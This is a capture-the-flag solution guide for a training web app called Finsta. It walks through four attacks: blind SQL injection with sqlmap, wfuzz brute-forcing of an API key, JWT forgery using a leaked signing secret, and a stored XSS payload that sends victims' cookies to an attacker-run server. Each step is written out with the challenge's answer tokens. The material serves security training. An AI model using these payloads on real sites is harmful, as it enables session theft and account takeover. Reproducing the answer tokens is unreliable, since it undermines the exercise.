# Finsta

*Solution Guide*

## Overview

In Finsta, the team is tasked with exploiting several vulnerabilities available on a new social media website, `finsta.pccc`. The team will need to perform a time-based SQL injection to extract a "password", exploit information leaked by the Finsta moderation team and `wfuzz` to get access to an undocumented API, trigger an error to leak debug information containing the secret for signing a JSON Web Token, and perform a stored XSS attack to obtain cookies. 

## Question 1

*Enter the token that is stored as targettim's password in the database.*


The first task requires the team to perform a blind SQL injection attack. 

There are several locations across the website where the user can input text that is passed to the database, but the only form that handles it incorrectly is the "I'm feeling lucky" Username search bar at the top of the screen. This search scans the database for a user containing the entered text, then redirects the user to their profile. No data is output; if no possible user exists, it redirects to the home screen.

First, to identify that this textbox is indeed vulnerable to SQL injection, we can simple enter a single quote, and we will be greeted with the following screen:

![Screenshot of the finsta.pccc website, which has a logo in the top left corner, a navigation bar on the left with "Home", "My Profile", and "Post!" options, and an "I'm feeling lucky" search box and login/sign-up button in the top right corner. Currently, the website shows "SERVER IN DEV MODE" with an SQL error due to an unrecognized ";" character.](./imgs/SQL-error.png "SQL error after entering quote")

Note only does this let us know the textbox is vulnerable, but also leaks the query itself. It would be very difficult to write our own injection to extract the database contents since nothing is printed, so we instead turn to `sqlmap`. First extract the table name and columns: `sqlmap "http://finsta.pccc/user?username=*" --schema --level=3`. Note the default prompt is correct except you do not need to follow the redirect.  

![Screenshot of sqlmap extracting the database schema, showing the table "Users" has 4 columns, one of which is the targeted "password" column.](./imgs/SQL-schema.png "SQL schema extracted with sqlmap")

Note that the level parameter must be increased from the default value of 1, otherwise the service will not be identified as vulnerable. Also, the entire database could just be dumped by omitting the table and column entirely, but this is slow (about 10 minutes) as the token is one of the last values to be extracted by sqlmap based on the sqlite metadata. Note also that during some of the heavier blind queries, the server may crash and you'll receive some `CRITICAL` error messages; `sqlmap` will still succeed at extracting the necessary values.

Now the following command can be used to extract the correct values: `sqlmap "http://finsta.pccc/user?username=*" --dump -T Users -C password --level=3`.  

![Screenshot of sqlmap extracting the token from the database. The other user passwords are "NOT USED" and the token is PCCC{b49db9}.](./imgs/SQL-token.png "Token extracted with sqlmap")

In this case, the token is `PCCC{b49db9}`.

## Question 2

*Enter the token that is stored in both the text and title fields of a deleted post from the finsta user.*

The next challenge uses `wfuzz` to exploit leaked secrets from the `finsta` user account. First, login using the account you created during recon and you'll be greeted with two posts by the `finsta` user account. The second one mentions a new API that will be available soon, and includes a screenshot of the API endpoint along with an apiKey (however, this key is partially cut-off in the screenshot).

![Screenshot of the finsta post, which contains an image showing a new API they intend to release. The API responds all of the posts from the website in JSON format. The API URL is included in the image.](./imgs/API-post.png "Leaked API interface")

We can try using the API ourselves by visiting `http://finsta.pccc/search?author=finsta&apiKey=67293047648892` and receive the following JSON output. You can do this in your browser, or using curl (note that the URL must be wrapped in quotes to avoid the `&` being interpretted as a special character by bash).

```bash
curl "http://finsta.pccc/search?author=finsta&apiKey=67293047648892"
```

```json
{"data":[],"message":"Invalid apiKey - wrong length","status":"ERROR"}
```

We can figure out the right length by adding extra digits. Adding an extra `11`, we get the following JSON output.

```json
{"data":[],"message":"Invalid apiKey - authorization failed","status":"ERROR"}
```

So the remaining key must fall between 01-99. We can figure this out quickly using wfuzz, an application that fuzzes (tries various different inputs) a website for errors. The command to try a range from 01-99 is `wfuzz -z range,01-99 finsta.pccc/search?apiKey=67293047648892FUZZ`, where the `FUZZ` is a special marker that wfuzz will replace with the new input. That is, wfuzz will test the apiKey with `6729304764889201`, then `6729304764889202`, and so on. In the implementation, the code can actually only be in the range of 10-99, so if the leading zero is omitted, that should not be a problem. The correct code can be identified by scrolling the output for the payload with a different size. A different size payload means that we have received a different message and this unique message should be inspected to see if it is useful.

![Screenshot of wfuzz output for the API key. The output shows the string "47" received a 200 status code and was 1737 characters long, while all the others gave a 400 error with a length of 79 characters.](./imgs/API-key.png "Using wfuzz to finish the key")

In this case, inspecting the differently-sized URL reveals the final two digits of the key are `47`, as we no longer receive the auth error.

After visiting `finsta.pccc/search?apiKey=6729304764889247`, we only get the list of posts that were already public. The image also showed we could provide different GET options like "author". Trying the API with the GET parameter "deleted=1" (`finsta.pccc/search?apiKey=6729304764889247&deleted=1`) gives the following JSON.

```json
{"data":[],"message":"Unknown parameter","status":"ERROR"}
```

Since the API tells us when a parameter is unknown, we can use `wfuzz` again to extract the API's valid options. This time, let's only show output with a length different from the error message using the `-hh` option (this is optional): `wfuzz --hh 59 -z file,/usr/share/wfuzz/wordlist/general/common.txt "finsta.pccc/search?apiKey=6729304764889247&FUZZ"` 

![Screenshot of wfuzz output for the API options. The options that returned a different character length were "archive", "tag", and "text", with "archive" receiving a 400 error.](./imgs/API-endpoint.png "Using wfuzz to find API options")

We recognize the `tag` and `text` as parts of the post, but `archive` is new. Visiting `finsta.pccc/search?apiKey=6729304764889247&archive=1` tells us `archive` must be either true or false.

```json
{"data":[],"message":"Parameter `archive` must be true/false","status":"ERROR"}
```

Setting `archive` to true (and optionally adding author to trim the output), we get the following from `http://finsta.pccc/search?apiKey=6729304764889247&archive=true&author=finsta`:

```json
{"data":[{"id":1,"tags":"Finsta~Welcome!","text":"Welcome to Finsta! We hope you love it here!","title":"Welcome!","username":"finsta"},{"id":2,"tags":"Finsta~NEW~OOOOO~AHHHH~MuchWOW","text":"Hey Finsta Fans! Next Friday we will be releasing our heavily-anticipated new feature... The Premium API! Our favorite (because they are paying us) users will soon have access to this powerful feature! After that release, the community has voted on.... support for image uploads! We have already started on that; check out this preview of both upcoming features!","title":"Coming soon!","username":"finsta"},{"id":null,"tags":"","text":"PCCC{42a979}","title":"PCCC{42a979}","username":"finsta"}],"message":"Success","status":"Success"}
```

In this case, the token is `PCCC{42a979}`.

## Question 3

*Enter the token that is displayed on the home page after becoming a premium user.*

Question 3 has us manipulating a JSON Web Token (JWT) to grant ourselves premium access to the site. JWT is a type of session token with configurable user-specific data as the contents, allowing the session information to be stored on the user's device rather than on the web/db server. A signature is included that is computed with a 256-bit key, (ideally) preventing attackers from tampering with the cookie. A JWT is (relatively) easy to recognize with its 3 base64-encoded segments. You can visit <https://jwt.io> to get a live demo.

After we login to the site, it's always a good idea to check what cookies have been set. To access and edit your cookies in Firefox, click the menu in the top right, then select `More tools > Web Developer tools`. With the web dev tools open, select the `Storage` tab, and cookies should be selected on the left by default. To edit a cookie, simply double-click on any of the values (name, value, domain, etc.) and type in the new value. Other browsers may have slightly different tabs (e.g., in Chrome, the cookies are under the `application` tab), but the process should be similar. Alternatively, you could use a specialized tool like curl or burpsuite.

![Viewing cookies in the Firefox browser. The more tools option is open in the top right and the option "Web Developer Tools" is chosen.](./imgs/JWT-cookie-open.png "Viewing cookies in browser")

![Screenshot of Firefox cookies, presented as a table with names, values, and other options. The selected cookie is "access_token", which has a long non-readable string as a value.](./imgs/JWT-cookie.png "Cookies set at login")

In this case, we have three cookies: a session cookie, a remember_token, and an access_token_cookie. We can investigate all three of these, but the access token has the following value in this case. Note in the above screenshot we double-clicked the `Value` column to access it (we can copy the value, paste a new one, or directly type into the box to change the value).

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc3NzIyOTMwOCwianRpIjoiYzNkMTQ5YzYtOTQ4ZS00ZTE3LTg2ODMtOGViOWIzMGE1N2VmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE3NzcyMjkzMDgsImlzUHJlbWl1bSI6ZmFsc2V9.JxANsr2z2tPdXzZy3w-TRIVPu0I8LjBac8LbBS8pmGM`

The three Base64-encoded segments separated by dots is a good indicator that this is a JWT. We can decode this either by copy-pasting into <https://jwt.io>, or we can use the command line: `echo "{TOKEN}" | jwt -show -`.

![Screenshot of the decoded JWT values. The output is JSON, with the interesting option being the "isPremium" tag.](./imgs/JWT-decoded.png "JWT values")

One of the values set in the Token claims is `isPremium`. Setting this value to true is exactly what we need. However, we cannot change this value without the secret value used to sign the JWT.

Going back to the website, we can try tampering with the JWT. Modifying or changing any part of the token, we get the following error screen after we refresh the page (for example, I replaced the entire token with the string "a"):

![Screenshot of finsta.pccc showing another DEV error page, this time due the tampered JWT token. In the error message, the JWT secret key is leaked.](./imgs/JWT-error.png "Error message from tampering with JWT")

This error message reveals the JWT secret key is `1092af3abd3ab823` in this case. Using this value, we can alter the JWT and correctly sign it afterwards. The web server will now believe that it signed the JWT and will trust the contents. We can use `https://jwt.io` (highly recommended) or the command line again:

```bash
echo -n "1092af3abd3ab823" | jwt -key - \
    -claim "fresh=false" \
    -claim "iat=1777229308" \
    -claim "isPremium=true" \
    -claim "jti=c3d149c6-948e-4e17-8683-8eb9b30a57ef" \
    -claim "nbf=1777229308" \
    -claim "sub=test" \
    -claim "type=access" \
    -sign + -alg HS256

# Outputs eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ImZhbHNlIiwiaWF0IjoiMTc3NzIyOTMwOCIsImlzUHJlbWl1bSI6InRydWUiLCJqdGkiOiJjM2QxNDljNi05NDhlLTRlMTctODY4My04ZWI5YjMwYTU3ZWYiLCJuYmYiOiIxNzc3MjI5MzA4Iiwic3ViIjoidGVzdCIsInR5cGUiOiJhY2Nlc3MifQ.9FDzrqNr0MZCl4VMyfi0d5ALEzpDhVNWgOqYjI0F0IM
```

Note when doing this yourself you will need to replace the secret value and the other json data (such as `iat` and `jti`) with the values you find. Also note that `isPremium` is now set to true. 

Now we place our new JWT token as the cookie's value by pasting directly into the value box and then refresh the home page with our new cookie.

![Screenshot of finsta.pccc, but the logo in the top left now says "Finsta Premium" in a fancy rainbow colored background, and a message at the top says "Congratulations! You are our first ever premium user! You won't regret this purchas, I promise." The token is then shown.](./imgs/JWT-premium.png "Token for the Premium user")

In this case, the token is `PCCC{070b8b}`.

## Question 4

*Enter the token that is stored in gregariousgreg's cookies.*

The final task requires us to use stored XSS to retrieve cookies from the user `gregariousgreg`. While the challenge guide does not explicitly say that we need to use XSS, the description provides some hints that this is what we need to do (that is, we need to steal a cookie while they actively browse the page, and we are told that the cookie has `httponly=false`, allowing the cookie to be accessed via Javascript).

First, let's find our injection site. Back on the index page (`finsta.pccc`), there was a paragraph about how Finsta allows users to modify their profile page using CSS against the advice of their "security experts". If you checked the profiles of some of the other users during your recon phase, you'll have seen some have dramatically altered the appearance of their web page (you can optionally investigate this further by checking the page source if you desire, otherwise we will find it shortly in this guide).

![Screenshot of Finsta's index page, which lists various features available in the website, including the ability to modify the website style.](./imgs/finsta-index.png "Finsta's Index Page")

![Screenshot of Finsta profile page with a modified styling. In this case, the regular gray background has been entirely replaced with a starry background image, and the text is now colored pink.](./imgs/XSS-edited-profile.png "Finsta account with modified CSS")

If we check our own profile and click Edit, we are presented with two textareas: one changes our bio, and the next sets our profile style. The textbook is looking for CSS, but let's instead see if we can insert Javascript (if you want to try CSS first, try something like `body {background-color: coral;}` to change the white background color). Let's insert a simple XSS test using Javascript that alerts with the string "Hi": `<script>alert("Hi")</script>`

![Screenshot of the Finsta profile edit page showing two text boxes. One edits the profile's Bio, while the other is for CSS code to change the style of the website.](./imgs/XSS-edit.png "Editing our Finsta style")

Visitng our profile, nothing happens. We should review our page's source code to see what happens to this code. This will depend on your browser/tool, but generally you can right click anywhere on the page and hit "view page source" (alternatively, you can add `view-source:` to the URL like `view-source:http://finsta.pccc/profile`). Doing so, we will see the following in the `head` tag:

```html
...
<style>
    <script>alert("Hi")</script>
</style>
...
```

Our script tag did not work becuase it is encapsulated inside a `style` tag, and thus is being treated as CSS. If we change the "style your profile" input to be `</style><script>alert("Hi")</script><style>`, we can exit the `style` tag and get our Javascript code to run. Note that we might need another opening `style` tag at the end to make sure all of the tags are properly opened/closed (HTML is a very lenient language, though, and may silently ignore the problematic `</style>`). 

Now when we visit our profile the new HTML code will be similar to the following. I've also included a reformatted version with comments to explain. Now our Javascript runs properly and we are greeted with a Javascript alert!

```html
<!-- Original; this is what you'll actually see -->
...
<style>
    </style><script>alert("Hi")</script><style>
</style>
...

<!-- Modified; reformatted with explaining comments -->
...
<style></style>  <!-- The </style> we began with closed the original starting <style> -->
<script>alert("Hi")</script> <!-- Our <script> tag is now outside of the <style> and runs -->
<style></style> <!-- The <style> we finish with opens a new <style> so the original </style> properly closes -->
...
```

![Screenshot of a Javascript alert saying "Hi".](./imgs/XSS-alert.png "Successful XSS using our Finsta style")

There are many different payloads that we can use to extract cookies; however, a lot of sample payloads you find online might not work. Payloads that require the browser automatically loading an external resource (for example, using the `onerror` attribute of an `img` tag) will not work, and the Javascript library is a bit old, so the `fetch` function is not defined. Instead, we need to write older, simpler Javascript like the code below, which works for our purposes. It makes an HTTP request back to an IP and port with the cookie included as a `GET` parameter. If we run a web server with sufficient logging, we can retrieve the cookie `GET` parameter from the request. 

First, we need to set up the web server to capture the incoming request. We can use one of Python's built in modules to do this with `python -m http.server`. This starts a web server in our local directory and the script will print the requested URL (including any `GET` parameters) any time someone makes a request to the server. By default, Python's simple HTTP server will listen on port `8000`, and we can find our IP address with `ip a`. Inject the following Javascript into the "style" input on your profile, replacing the IP and port with your values.

```javascript
</style>
<script>
    x = new XMLHttpRequest()
    x.open('GET', 'http://{IP}:{PORT}?cookie=' + document.cookie);
    x.send();
</script>
<style>
```

We don't actually have any `httpOnly=false` cookies on this site, however. When this option is false, as hinted at in the challenge description, allows for cookies to be accessible by Javascript. To test our XSS payload, add a cookie yourself or change one of the existing cookies to be accessible to Javascript by setting `httpOnly=false`. The following image shows a new `test` cookie with value `test` and highlights the "Add Item" plus symbol used to add new cookies; the `httpOnly` column should default to false, but you can manually change it if needed.

![Screenshot of Firefox cookies with a new "test" entry with a value of "test" and the "httpOnly" column set to "false".](./imgs/XSS-test-cookie.png "New test cookie with httpOnly set to false")

With the new cookie set, any time we (or anyone else) visit our profile, the XSS runs. Any vulnerable cookies will be extracted and sent over HTTP to our server. Our python server then outputs the request like in the following image. The first line of output shows what happens when there are not vulnerable cookies set, and the second line shows a vulnerable cookie being extracted.

![Screenshot of the python web server logging output showing incoming requests. An incoming GET request is shown with the leaked cookie appended in the requested URL path: "/?cookie=test=test".](./imgs/XSS-test.png "Extracted test cookie using XSS")

With our exploit set up, we now need to get Greg to visit our profile and execute our exploit. To do so, we visit `challenge.pccc` and click "Grade".

![Screenshot of challenge.pccc running the grading check. The site says Greg is browsing finsta.pccc with his sensitive cookie, but that Greg did not find any posts about his interests.](./imgs/XSS-greg-fail.png "Greg did not find any interesting profiles")

Since we have no posts, Greg did not have any reason to visit our profile! Reviewing Greg's profile, we find the following:

![Screenshot of Greg's post on Finsta, where we says that he is looking for friends and that he is interested in the following things: SunBattles, FightTook40k, PuzzleOfChairs, and KingoftheBracelets.](./imgs/XSS-greg.png "Greg posting his interests")

To get Greg to visit our profile, we can use the `tag` system hinted at back on the index page. Let's tag all of his interests in a single post. Click the "Post!" button on the left when logged in to do so. If you do not tag all of his posts, an error message will instead appear saying Greg only found some slightly interesting posts, hinting that you need all four: `SunBattles~FightTool40k~PuzzleofChairs~KingoftheBracelets`

![Screenshot of a post Greg will like. The Post title is "Title doesn't matter", the tags list all of his interests with a "~" character between each, and the body reads "Body doesn't matter either".](./imgs/XSS-post.png "Tagging all of Greg's interests")

Now we can trigger Greg again at `challenge.pccc`. It now tells us that Greg visited the profile of our user, `test`, so we should check the output of our Python simple HTTP server.

![Screenshot of challenge.pccc running the grading check. The site says Greg is browsing finsta.pccc with his sensitive cookie, and that Greg visited the profile of the user "test".](./imgs/XSS-greg-success.png "Greg visits the profile of user test")

![Screenshot of the python web server logging output showing incoming requests. An incoming GET request is shown with the leaked cookie appended in the requested URL path: "/?cookie=token=PCCC{2e7da0}".](./imgs/XSS-token.png "Greg's token stolen using XSS")

In this case, the token is `PCCC{2e7da0}`.